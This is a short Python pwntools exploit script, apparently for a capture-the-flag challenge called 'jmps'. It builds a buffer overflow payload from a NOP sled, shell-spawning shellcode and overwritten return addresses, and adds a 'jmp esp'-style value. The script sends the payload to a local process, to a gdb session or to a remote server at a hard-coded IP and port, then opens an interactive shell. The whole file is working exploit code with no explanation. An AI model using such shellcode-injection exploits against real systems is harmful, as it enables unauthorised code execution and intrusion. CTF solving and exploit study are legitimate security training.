from pwn import *

debug = True
debug = False

local = False
local = True

address = 0x804A048
shellcode = asm(shellcraft.sh())
# buf = '\x90'*(44 - len(shellcode) + 4) + shellcode + p32(address)*4
buf = '\x90'*10 + shellcode + p32(address)*4 + '\x90'*12 + shellcode

number = str(0x4040e4ff)#asm('jmp esp')) + 'AA'

if not debug:

	if local:
		p = process('/home/nscd/tu_ctf/jmps')
		print p.recvuntil('name?')
		p.sendline(buf)
		print p.recvuntil('number?')
		p.sendline(number)
		# print p.recvall()
		p.interactive()
	else:
		with remote('130.211.202.98', 7575) as p:
			print p.recvuntil('name?')
			p.sendline(buf)
			print p.recvuntil('number?')
			p.sendline(number)
			# print p.recvall()
			p.interactive()
else:
	p = process(['gdb', '-q', '/home/nscd/tu_ctf/jmps'])

	p.sendline('unset env LINES')
	p.sendline('unset env COLUMNS')
	# p.sendline('b *0x8048557')
	p.sendline('b *0x80485DF')

	print p.recvuntil('(gdb)')
	p.sendline('r')

	print p.recvuntil('name?')
	p.sendline(buf)

	print p.recvuntil('number?')
	p.sendline(number)

	print p.recvuntil('gdb')
	p.sendline('x/100x $sp')

	p.interactive()
